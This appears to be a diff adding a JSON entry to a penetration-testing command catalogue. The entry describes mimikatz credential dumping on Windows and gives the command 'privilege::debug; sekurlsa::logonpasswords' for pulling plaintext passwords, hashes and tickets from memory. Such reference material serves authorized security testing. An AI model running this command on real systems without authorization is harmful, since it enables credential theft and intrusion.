@@ -1,0 +1,23 @@
+{
+  "id": "a0e3c37f-661",
+  "name": "mimikatz - credential dumping (Windows)",
+  "tool": "mimikatz",
+  "description": "Extract plaintext credentials, hashes and tickets from Windows memory.",
+  "tags": [
+    "mimikatz",
+    "post-ex",
+    "credentials"
+  ],
+  "ports": [],
+  "commands": [
+    {
+      "name": "Dump logon passwords",
+      "command": "privilege::debug; sekurlsa::logonpasswords",
+      "description": "Run inside mimikatz to retrieve credentials.",
+      "ports": []
+    }
+  ],
+  "created": "2025-09-23T00:00:00Z",
+  "modified": "2025-09-23T00:00:00Z",
+  "platform": "any"
+}
